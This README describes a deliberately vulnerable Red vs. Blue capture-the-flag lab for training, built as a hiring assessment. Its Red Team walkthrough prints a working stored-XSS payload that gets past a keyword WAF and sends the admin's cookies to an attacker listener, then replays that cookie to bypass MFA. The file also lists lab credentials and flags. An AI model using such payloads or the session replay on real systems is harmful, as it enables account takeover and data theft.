# Cyber Range — "Cookies Reuse & MFA Bypass"

Practical assessment submission for **PT Nauli Mula Data — Cybersecurity Engineer (Lab & Range Developer)**.

A self-contained **Red vs. Blue** Capture-The-Flag lab built around a flawed
session-token issuance design in a corporate *Admin Feedback System*. The lab is
containerised with Docker Compose and is intended to be deployed inside a single
Linux VM on a Proxmox hypervisor.

- **Red Team path** — XSS → session replay → MFA bypass
- **Blue Team path** — log forensics, threat hunting, incident response

> ⚠️ **This application is intentionally vulnerable. Run it only inside an
> isolated lab network. Never expose port 3075 / 2275 to the internet.**

---

## 1. Architecture

```
                     ┌──────────────────────── VM / Proxmox guest ────────────────────────┐
                     │                                                                    │
  Red Team  ───HTTP──┼──▶  :3075  ┌───────────────────────┐                                │
  (attacker)         │           │  app  (Node.js/Express)│  logs ─┐                       │
                     │           │  Admin Feedback System │        │                       │
                     │           └───────────────────────┘        ▼                       │
                     │           ┌───────────────────────┐  /opt/admin/logs               │
  bot (admin) ───────┼──▶  app   │  bot  (headless Chrome)│  access.log  error.log        │
  reviews dashboard  │           │  signs in + opens /dash │        ▲                       │
                     │           └───────────────────────┘        │                       │
  Blue Team  ──SSH───┼──▶  :2275  ┌───────────────────────┐        │                       │
  (analyst)          │           │  sshd (linuxserver)    │────────┘  reads the shared logs│
                     │           └───────────────────────┘                                │
                     └────────────────────────────────────────────────────────────────────┘
```

| Component | Image / build | Host port | Purpose |
|-----------|---------------|-----------|---------|
| `app`  | `application/app` (node:20-alpine) | `3075` → 3075 | Vulnerable web application (HTTP) |
| `bot`  | `application/bot` (node:20-slim + Chromium) | – | Simulated admin that logs in (incl. MFA) and reviews `/dashboard` |
| `sshd` | `lscr.io/linuxserver/openssh-server` | `2275` → 2222 | Blue Team SSH access, shares `/opt/admin/logs` |

Internal DNS: the VM maps `feedback.admin.local → 127.0.0.1` (see `provision.sh`).

---

## 2. Deployment (Proxmox environment)

The lab is designed to run inside **one Linux VM on a Proxmox hypervisor**.
Full detail (GUI, `qm` CLI, cloud-init automation and VM template/image export)
lives in **[`PROXMOX-DEPLOY.md`](PROXMOX-DEPLOY.md)** — the short version follows.

**Step 1 — create the VM on Proxmox** (web UI `https://<pve-ip>:8006` → *Create VM*):

| Setting | Value |
|---------|-------|
| OS | Debian 12 or Ubuntu 24.04 |
| CPU / RAM | 2 cores / 4096 MB |
| Disk | 20 GB — plus ~8 GB free for the Docker images (the bot image pulls Chromium) |
| Network | Bridge `vmbr0`, model `VirtIO` |

The same from the Proxmox shell:

```bash
qm create 900 --name cyberrange --memory 4096 --cores 2 --net0 virtio,bridge=vmbr0
```

> Use **bridged** networking, not NAT-only: the Red Team phase needs the in-guest
> bot container to reach the attacker's listener for the cookie exfiltration.

**Step 2 — deploy inside the VM** (as root):

```bash
apt-get update && apt-get install -y git
git clone https://github.com/iduy01/naulidata-cyberrange.git
cd naulidata-cyberrange
sudo bash scripts/provision.sh      # Docker + /opt/admin/logs + DNS + compose up + seed logs
```

`provision.sh` is idempotent and self-contained: it installs Docker Engine + the
compose plugin if missing, creates `/opt/admin/logs`, maps
`feedback.admin.local → 127.0.0.1`, builds and starts the three services, then
seeds the mock telemetry.

Manual equivalent, if you prefer to run the steps yourself:

```bash
mkdir -p /opt/admin/logs
docker compose -f docker/docker-compose.yml up -d --build
python3 scripts/inject_logs.py --dir /opt/admin/logs --clear
```

**Step 3 — verify and reach it:**

```bash
bash scripts/verify.sh              # -> 20 passed, 0 failed
curl -i http://127.0.0.1:3075/      # X-Powered-By: Node.js (Express)
curl -s http://127.0.0.1:3075/robots.txt
ssh analyst@<VM-IP> -p 2275         # pw: blue_team_rocks
#   analyst@analyst-box:~$ ls -la /opt/admin/logs
```

| Access | Address |
|--------|---------|
| Web app (vulnerable) | `http://<VM-IP>:3075` |
| Blue Team SSH | `ssh analyst@<VM-IP> -p 2275` (pw `blue_team_rocks`) |
| Logs | `/opt/admin/logs/access.log`, `/opt/admin/logs/error.log` |

Teardown:

```bash
docker compose -f docker/docker-compose.yml down -v
```

---

## 3. Lab credentials & parameters

| Item | Value |
|------|-------|
| Admin username | `admin` |
| Admin password | `Adm1n@Feedback2026` |
| MFA code | `123456` |
| Blue Team SSH | `analyst` / `blue_team_rocks` on port `2275` |
| Log directory | `/opt/admin/logs` (`access.log`, `error.log`) |
| Pre-auth cookie | `pre_mfa_session=pending_mfa_verification` (HttpOnly=False) |
| Admin session cookie | `adm_sess_<32 hex>` (HttpOnly=False, never expires) |

These are **lab** credentials, intentionally published so both teams can operate.

---

## 4. Walkthrough — proof the lab works

`<IP>` is the VM's address. Every command and its output below comes from a live
deployment; `bash scripts/verify.sh` reports **20 passed, 0 failed**.

### Red Team path — XSS → session replay → MFA bypass

**1. Reconnaissance**

```bash
curl -i http://<IP>:3075/ | head -4
# HTTP/1.1 200 OK
# X-Powered-By: Node.js (Express)
# Set-Cookie: pre_mfa_session=pending_mfa_verification; Path=/; SameSite=Lax

curl -s http://<IP>:3075/robots.txt
# User-agent: *
# Disallow: /api/verify-mfa
# Disallow: /dashboard
```

**2. The WAF blocks the naive payload**

```bash
curl -s -o /dev/null -w '%{http_code}\n' -X POST http://<IP>:3075/api/feedback \
  --data-urlencode 'message=<script>alert(1)</script>'
# 403
```
`<script`, the raw keywords `document` / `cookie`, and `onerror` are all blocked.

**3. Bypass — HTML5 `<svg onload>` + bracket-notation cookie access**

```bash
python3 exploit/exfil_server.py --port 8899          # terminal 1: the listener

curl -s -o /dev/null -w '%{http_code}\n' -X POST http://<IP>:3075/api/feedback \
  --data-urlencode 'author=pwn' \
  --data-urlencode "message=<svg onload=\"fetch('http://<ATTACKER>:8899/?c='+encodeURIComponent(window['docu'+'ment']['coo'+'kie']))\">"
# 200
```

**4. The admin bot opens `/dashboard`, the stored payload fires**

```
[+] STOLEN COOKIE: pre_mfa_session=pending_mfa_verification; adm_sess=adm_sess_16e82e67f34a38a93813553723de6fca
```

**5. Replay the stolen cookie — MFA is never solved**

```bash
curl -s -o /dev/null -w '%{http_code}\n' \
  -b 'adm_sess=adm_sess_16e82e67f34a38a93813553723de6fca' http://<IP>:3075/dashboard
# 200                      <- and /api/verify-mfa was never contacted

curl -s -b 'adm_sess=adm_sess_16e82e67f34a38a93813553723de6fca' \
  http://<IP>:3075/dashboard | grep -o 'SCENARIO75{RED[^}]*}'
# SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
```

### Blue Team path — log forensics → threat hunting → incident response

```bash
ssh analyst@<IP> -p 2275       # pw: blue_team_rocks
cd /opt/admin/logs && ls -la   # access.log   error.log
```

**1. Log forensics — who, what, when**

```bash
grep '10.10.14.50' access.log
# 10.10.14.50 - - [08/Oct/2026:18:49:30 +0700] "GET /robots.txt HTTP/1.1" 200 118 "-" "Mozilla/5.0 (…)" xff=10.10.14.50
# 10.10.14.50 - - [08/Oct/2026:18:49:58 +0700] "GET / HTTP/1.1" 200 4831 "-" "Mozilla/5.0 (…)" xff=10.10.14.50
# 10.10.14.50 - - [08/Oct/2026:18:50:15 +0700] "POST /api/feedback HTTP/1.1" 403 0 "-" "Mozilla/5.0 (…)" xff=10.10.14.50
# 10.10.14.50 - - [08/Oct/2026:18:50:48 +0700] "POST /api/feedback HTTP/1.1" 200 401 "-" "Mozilla/5.0 (…)" xff=10.10.14.50
# 10.10.14.50 - - [08/Oct/2026:18:51:55 +0700] "GET /dashboard HTTP/1.1" 200 9120 "-" "Mozilla/5.0 (…)" xff=UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0
# 10.10.14.50 - - [08/Oct/2026:18:52:40 +0700] "GET /dashboard HTTP/1.1" 200 9160 "-" "Mozilla/5.0 (…)" xff=UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0
```

The story reads straight off the log: recon → blocked payload (`403`) → bypassed
payload (`200`) → authenticated `/dashboard` at `18:51:55`.

**2. Threat hunting — baseline vs attacker**

```bash
grep -c '192.168.1.100' access.log                     # 5   legitimate baseline
grep -c '10.10.14.50'  access.log                      # 6   attacker (10.10.14.0/24)
grep '10.10.14.50' access.log | grep -c verify-mfa     # 0   attacker never solved MFA
grep 'first <script>' error.log
# 2026-10-08T18:50:15+07:00 [CRITICAL] WAF ALERT: first <script> tag blocked for 10.10.14.50
```

**3. Incident response — decode the header, confirm the bypass**

```bash
grep -o 'UEhBTlRPTUdSSUR7[A-Za-z0-9+/=]*' access.log | sort -u
# UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0

echo 'UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0=' | base64 -d
# PHANTOMGRID{BLUE_L0g_Hunt3r_M4st3r}     <- 44 characters, Base64

grep 'Authentication bypass' error.log
# 2026-10-08T18:53:10+07:00 [CRITICAL] Authentication bypass anomaly: admin session cookie reused without MFA. user=admin src=10.10.14.50 path=/dashboard verification=/api/verify-mfa(skipped) X-Forwarded-For=UEhBTlRPTUdSSUR7…
# 2026-10-08T18:53:10+07:00 [CRITICAL] cookie reuse event flagged CRITICAL (bearer token not bound to client)
```

Final Blue Team flag: `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`.

### Requirement → proof

| Requirement in the brief | Proof in this repo |
|---|---|
| Linux + Docker Compose, deployable as one VM | `docker/docker-compose.yml` (3 services); `bash scripts/verify.sh` → 20/20 |
| Web app on **3075**, SSH on **2275** | `curl http://<IP>:3075/`, `ssh analyst@<IP> -p 2275` |
| Internal zone `feedback.admin.local` | set by `provision.sh` (`grep feedback.admin.local /etc/hosts`) |
| WAF blocks the naive XSS | walkthrough, Red Team step 2 → `403` |
| WAF bypass works | walkthrough, Red Team step 3 → `200` |
| MFA bypassed through cookie reuse | walkthrough, Red Team step 5 → `/dashboard` `200`, `/api/verify-mfa` never contacted |
| Logs shared with the Blue Team | `ssh analyst@<IP> -p 2275` → `/opt/admin/logs` |
| Telemetry tells the full story | walkthrough, Blue Team steps 1–3 |

The complete flag list is in [`ANSWER-KEY.md`](ANSWER-KEY.md). The longer Red/Blue
walkthroughs, runbook, written explanation, verification evidence and
presentation deck/ebook are delivered as **separate attachments**, not in this
repository.

---

## 5. Repository layout

```
naulidata-cyberrange/
├── application/                 # 1. APPLICATION SOURCE CODE (Node.js)
│   ├── app/
│   │   ├── server.js            # all logic: WAF, sessions, dashboard, logging
│   │   └── package.json
│   └── bot/                     # headless-Chromium admin simulator (drives the XSS)
│       ├── bot.js
│       └── package.json
├── docker/                      # 2. DOCKER / DOCKER COMPOSE
│   ├── docker-compose.yml       # 3 services: app, bot, sshd
│   ├── app.Dockerfile
│   └── bot.Dockerfile
├── scripts/                     # 3. SETUP / PROVISIONING SCRIPTS
│   ├── provision.sh             # Proxmox VM: Docker + /opt/admin/logs + DNS + compose up + seed
│   ├── proxmox-create-vm.sh     # creates the VM on a Proxmox node (cloud-init driven)
│   ├── cloud-init-user-data.yaml# first-boot automation: clone repo + run provision.sh
│   ├── inject_logs.py           # generate/inject the mock telemetry
│   └── verify.sh                # automated self-test of the whole lab (Red + Blue)
├── exploit/
│   ├── exfil_server.py      # captures exfiltrated cookies
│   ├── red_team_exploit.py  # end-to-end Red Team automation
│   └── replay_cookie.sh     # one-liner cookie replay
├── logs-sample/                 # sample telemetry (the live logs/ dir is git-ignored)
├── logs/                        # created at deploy time, bind-mounted to /opt/admin/logs
├── PROXMOX-DEPLOY.md            # deploy as a VM on Proxmox (GUI / cloud-init / template export)
├── CODE-REPOSITORY.md           # map of this repo to the submission requirements
├── ANSWER-KEY.md
└── README.md
```

---

## 6. Notes & known quirks (assessment transparency)

- **Never name the service `app` for the headless browser.** The `.app` TLD is on
  the Chromium **HSTS preload list**, so a headless browser navigating to
  `http://app:3075` is silently force-upgraded to HTTPS and fails with
  `net::ERR_SSL_PROTOCOL_ERROR`. The lab therefore exposes network aliases
  `feedback` / `feedback.admin.local` and points the bot at `http://feedback:3075`.
- **Base64 length mismatch.** The assessment text states the `X-Forwarded-For`
  Base64 string is *44 characters* and decodes to `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}`.
  The literal string supplied in the brief is in fact **47 characters** and decodes
  to `PHANTOMGRID{BLUE_L0g_Hunt3r_M4st3r}`. The lab reproduces the **literal string
  exactly as given** (so the Blue Team's binary-search/threat-hunt answer matches the
  brief) and documents the discrepancy here. A corrected, padding-valid alternative is
  `U0NFTkFSSU83NXtCTFVFX0wwR19IVW50M3JfTTRzdDNyfQ==`.
- **Forged cookies are rejected.** `adm_sess` is validated against a server-side set,
  so *replay* of a genuinely issued token works, but brute-forcing a random token does
  not — this keeps the scenario realistic (the flaw is reuse, not predictability).
- **In-memory state.** `adm_sess` tokens and the feedback queue live in memory and are
  cleared on container restart; the simulated telemetry in `/opt/admin/logs` persists.
- **The bot requires egress.** For the XSS `fetch()` to reach the Red Team, the bot
  container must be able to route to the attacker's listener. In a Proxmox lab this is
  the same L2/L3 zone; if you run it locally, use the host network so the bot can reach
  an exfil server bound on the host.
